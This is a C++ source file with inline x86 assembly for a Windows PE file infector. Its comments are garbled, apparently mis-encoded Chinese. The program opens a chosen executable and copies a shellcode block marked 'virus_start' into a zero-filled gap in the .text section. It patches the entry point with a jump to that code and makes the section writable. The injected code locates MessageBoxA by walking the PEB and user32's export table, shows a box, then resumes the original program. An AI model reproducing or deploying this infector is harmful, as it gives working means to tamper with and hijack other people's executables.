// Win-�����ת����.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<windows.h>
#include<cstdio>

const int PEtoEntryPoint = 0x28;//��ڵ������PEͷ��ƫ��
const int textCharacteristics = 0x24;
int PEHeadOffset, EntryPoint, textOffset, textRVA, textFO, textSize, textVK, zeroOffset, ImageBase, iVirusSize = 0;
PVOID pvFile = NULL;

TCHAR* CreateCode()
{
	int VirusStart, VirusEnd;
	_asm{
		mov VirusStart, offset virus_start
			mov VirusEnd, offset virus_end
	}
	iVirusSize = VirusEnd - VirusStart;
	TCHAR* pCode = (TCHAR *)malloc(iVirusSize);
	if (NULL == pCode)
	{
		return 0;
	}

	memcpy(pCode, (void *)VirusStart, iVirusSize);
	*(int *)((char *)pCode+5) = 22;//��д���Ƚϵ��ַ����ĳ���
	wcscpy((TCHAR *)((char *)pCode + 9), L"USER32.dll");
	strcpy((char *)((char *)pCode + 31), "MessageBoxA");
	memcpy((char *)((char *)pCode + 43), (char *)((PSTR)pvFile + EntryPoint - textVK), 5);//��дԭ��ڵ㱻���ǵ�5�ֽ�
	*(int *)((char *)pCode + 48) = ImageBase + EntryPoint;//��д��ʼ��ַVA

	return pCode;

virus_start:
	_asm{
		call yy
		//�ַ�������
		nop
		nop
		nop
		nop
		////USER32.dll��Unicode�ַ���
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		///MessageBoxA�ַ��� ����Ϊ12
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		/////
		//�����ʼ��ڵ��5�ֽ�����
		nop
		nop
		nop
		nop
		nop
		//�����ʼ��ڵ�ַ
		nop
		nop
		nop
		nop
		
	yy:
		pop ecx//ECX��ŵ�ǰ��ַ
		push ecx//esp+8h�Ϳ����ҵ���ǰ��ַ
		mov eax, fs:[30h]
		mov eax, [eax + 0ch]
		mov eax, [eax + 0ch]
		mov edx, eax//edx��ŵ�һ��
		push edx//esp+4h�����ҵ���һ��PEB�ṹ�ĵ�ַ�������Ա��Ƿ��Ѿ�����������������������������û��д�жϵĴ���
		push eax//��ʱ����eax
	find:
		pop eax//��ԭeax
		mov eax, [eax] //ָ����һ��PEB�ṹ
		push eax//��ʱ����eax
		mov ecx, [esp + 8h]//ecxָ������׵�ַ
		mov ebx, [eax+30h]//PEB�ṹ��ƫ��30h�ĵط�����DLL������
		push ebx
		push [ecx]//���ﴫ��Ҫ�ҵ�DLL�ļ����ȣ�ע������Unicode�ַ���
		mov ebx,ecx
		add ebx,4
		push ebx//���ﴫ��Ҫ�ҵ�DLL�ļ���ַ��
		call CmpStr
		add esp,0xc//ƽ���ջ
		test eax,eax
		jz find
		jmp FindOut
	CmpStr://��ջ˳�� �ַ���1 ���� �ַ���2
		mov ecx, [esp+8h]//�ַ����ĳ���
		mov edi, [esp+4h]//��һ���ַ���
		mov esi, [esp+0xc]//�ڶ����ַ���
		xor eax,eax
		cld
		repz cmpsb
		test ecx,ecx
		jz same
		ret
	same:
		inc eax
		ret

	FindOut:
		pop eax//��ԭeax
		add esp,4h//��ԭ��ջ����ʼֵ,��ʱջ��ֻ���²���������׵�ַ
		mov eax, [eax+18h]//��ʱeax=user32.dll���ڴ��е��׵�ַ
		mov ebx, [eax+10ch]//���ϻ�ַ��ebx��Ϊ�������VA
		push ebx//����user32.dll�Ļ�ַ
		add ebx, [eax + 150h]//user32.dllƫ��150h�ĵط�����˵������RVA
		mov edx, [ebx+20h]//������ƫ��20hΪ�����������ĵ�ַ��RVA
		add edx, [esp]//���ϻ�ַ

		push 0//�����ַ���ָ��MessageBoxA�ڱ����ŵڼ�λ
	findUser32:
		mov ecx, [esp+8h]
		add ecx,26
		push ecx
		push 12//MessageBox�ַ����ĳ���
		mov ecx,[edx]
		add ecx, [esp+0xc]//���ϻ�ַ
		push ecx
		call CmpStr
		add esp, 0xc//ƽ���ջ
		add edx,4
		mov esi, [esp]
		add esi,1
		mov [esp],esi
		test eax,eax
		jz findUser32
		//ִ�е�����ʱ�Ѿ��ҵ���MessageBoxA�ڵ�����������ָ������ڵڼ�λ��������ջ��
		pop eax
		dec eax
		push eax
		//��Ϊ�����ҵ�MessageBoxA���ڵ�λ�ú���Ȼ�ü���������1������ƫ�ƶ���һλ���ʼ�ȥһλ

		mov eax, [esp+4h]//eax=user32.dll���ڴ��е��׵�ַ
		mov eax, [eax+150h]//eax=�������RVA
		add eax, [esp+4h]//eax=�������VA
		mov ebx, [eax+24h]
		add ebx, [esp+4h]//ebx=��ű��VA
		pop eax//eax=MessageBoxA�ں�������ָ������ڵڼ�λ
		mov ecx,2h
		mul ecx//��ű�һ�����ֽ�
		add ebx,eax//ebx=MessageBoxA����ű��VA
		xor ecx,ecx
		mov cx, word ptr[ebx]//ecx=MessageBoxA�ڵ�ַ���еڼ�λ

		mov eax, [esp]////eax=user32.dll���ڴ��е��׵�ַ
		mov eax, [eax + 150h]//eax=�������RVA
		add eax, [esp]//eax=�������VA
		mov ebx, [eax + 1ch]
		add ebx, [esp]//ebx=����������ַ��VA
		mov eax,4h
		mul ecx
		add ebx,eax//ebx=MessageBoxA�ڵ���������ַ���е�VA
		mov edx, [ebx]//edx=MessageBoxA��RVA
		add edx, [esp]//edx=MessageBoxA��VA

		//Ϊ�˼򵥣��������ַ����Ҿ��ò����������еġ�MessageBoxA������USER32.dll�������ã���Ϊ��Unicode�ַ���
		mov eax, [esp+4h]
		add eax,26
		push 0
		push eax
		push eax
		push 0
		call edx

		mov eax, [esp+4h]//eax=����������ʼVA
		mov ebx, [eax+38]//ebx=Ҫ�ָ����ַ���ǰ4�ֽ�
		mov ecx, [eax+43]//ԭ���VA
		mov [ecx],ebx
		mov dl, byte ptr[eax+42]//�ָ����һ���ֽ�
		mov byte ptr[ecx+4],dl
		add esp,8//��ԭ��ջ
		jmp ecx
		




	}
virus_end:
	;
}
int findZero(PVOID file, int start, int size)//����һ������128�ֽڶ���0������
{
	bool OK = true;
	while (1)
	{
		OK = true;
		for (int i = 0; i < size; i++)
		{
			if (0 != *((PSTR)file + start + i))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int findSection(char *name, PVOID file, int start)//�ҵ�PEͷ������Ϊ*name�����ε�������Ϣ���ļ�ƫ��
{
	//int offset = start;
	bool OK;
	while (1)
	{
		OK = true;
		for (int i = 0;; i++)
		{
			if (*(name + i) == '\0'&&*((PSTR)file + i + start) == '\0')
				break;
			if (*(name + i) != *((PSTR)file + i + start))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR szBuf[512];
	wscanf_s(L"%ls", szBuf, _countof(szBuf));
	HANDLE hNormalFile = CreateFile(szBuf, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hNormalFile)
	{
		printf("���ļ�����,�������%d", GetLastError());
	}
	DWORD dwFileSize = GetFileSize(hNormalFile, NULL);
	HANDLE hFileMap = CreateFileMapping(hNormalFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (NULL == hFileMap)
	{
		printf("�����ڴ�ӳ���ļ�ʧ��,�������%d", GetLastError());
	}
	pvFile = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (NULL == pvFile)
	{
		printf("ӳ���ļ�ʧ��,�������%d", GetLastError());
	}

	PEHeadOffset = *(int *)((PSTR)pvFile + 0x3c);
	EntryPoint = *(int *)((PSTR)pvFile + PEHeadOffset + PEtoEntryPoint);
	//PEͷƫ��0x78��DataDirectory�ֶΣ�DataDirectory�ֶΰ���16����Ϣ��ÿ��8�ֽ�
	//textVK = *(int *)((PSTR)pvFile + PEHeadOffset + 0x78+16*8+)
	textOffset = findSection(".text", pvFile, 0);
	textRVA = *(int *)((PSTR)pvFile + textOffset + 12);//���α�����ʼƫ��12�ֽڴ�Ϊ�����ε�RVA
	textFO = *(int *)((PSTR)pvFile + textOffset + 20);//���α�����ʼƫ��20�ֽڴ�Ϊ�����ε�File Offset
	textSize = *(int *)((PSTR)pvFile + textOffset + 16);//ƫ��16�ֽ�Ϊ���������ļ��ж����ĳߴ�
	textVK = textRVA - textFO;
	ImageBase = *(int *)((PSTR)pvFile + PEHeadOffset + 0x34);
	zeroOffset = findZero(pvFile, textFO, 80);//��Ҫ���ƵĴ�����71�ֽ�

	TCHAR *code = CreateCode();
	memcpy((PSTR)pvFile + zeroOffset, code, iVirusSize);

	//�޸�ԭ��ڵ㣬��ת����������
	*((PSTR)pvFile + EntryPoint - textVK) = 0xe9;
	*(int *)((PSTR)pvFile + EntryPoint - textVK + 1) = (zeroOffset - textVK) - (EntryPoint - textVK) - 5;

	//�޸�.text��������Ϊ�ɶ���д
	int Characteristics = *(int *)((PSTR)pvFile + textOffset + textCharacteristics);
	Characteristics |= 0x80000000;
	*(int *)((PSTR)pvFile + textOffset + textCharacteristics) = Characteristics;

	UnmapViewOfFile(pvFile);
	return 0;
}